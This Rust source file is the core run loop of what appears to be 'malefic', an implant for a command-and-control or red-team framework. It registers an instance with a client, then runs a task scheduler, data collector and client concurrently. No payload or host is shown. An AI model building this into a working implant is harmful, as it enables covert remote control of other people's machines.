use async_std::channel::{Receiver, Sender};
use async_std::channel::unbounded as channel;
use futures::try_join;
use malefic_helper::debug;
use malefic_helper::protobuf::implantpb::{Spite, Spites};
use malefic_helper::protobuf::implantpb::spite::Body;
use modules::MaleficModule;
use crate::collector::Collector;
use crate::malefic::client::MaleficClient;
use crate::scheduler::{Scheduler, TaskOperator};

pub struct Malefic {}


pub struct MaleficChannel {
    pub(crate) data_sender: Sender<Spite>,
    pub(crate) request_sender: Sender<bool>,
    pub(crate) response_receiver: Receiver<Spites>,
    pub(crate) scheduler_task_sender: Sender<(bool, u32, Box<MaleficModule>, Body)>,
    pub(crate) scheduler_task_ctrl : Sender<TaskOperator>,
}


impl Malefic {
    pub async fn run(instance_id: [u8;4]) {
        let (collector_response_sender, collector_response_receiver) = channel();

        let mut collector = Collector::new(collector_response_sender);
        let mut scheduler  = Scheduler::new(collector.get_data_sender());
        let channel = MaleficChannel {
            data_sender: collector.get_data_sender(),
            request_sender: collector.get_request_sender(),
            response_receiver: collector_response_receiver,
            scheduler_task_sender: scheduler.get_task_sender(),
            scheduler_task_ctrl: scheduler.get_task_ctrl_sender(),
        };

        let mut client = MaleficClient::new(instance_id, channel);
        if !client.register().await {
            debug!("register failed");
            return;
        }

        let _ = try_join!(
            // modules.run(),
            scheduler.run(),
            collector.run(),
            client.run()
        );
    }
}
